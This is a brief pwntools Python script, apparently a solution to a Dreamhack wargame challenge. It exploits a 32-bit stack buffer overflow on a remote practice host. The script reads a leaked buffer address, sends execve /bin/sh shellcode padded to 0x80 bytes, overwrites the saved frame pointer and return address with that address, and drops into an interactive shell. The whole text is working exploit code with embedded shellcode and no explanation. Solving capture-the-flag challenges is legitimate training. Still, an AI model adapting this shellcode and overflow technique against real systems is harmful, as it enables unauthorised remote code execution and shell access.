from pwn import *

p = remote('host3.dreamhack.games', 22972)

p.recvuntil('buf = (')
bufaddr = int(p.recv(10), 16)

payload = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80'
payload += b'A' * (0x80 - len(payload))
payload += b'B' * 0x04
payload += p32(bufaddr)

p.send(payload)
p.interactive()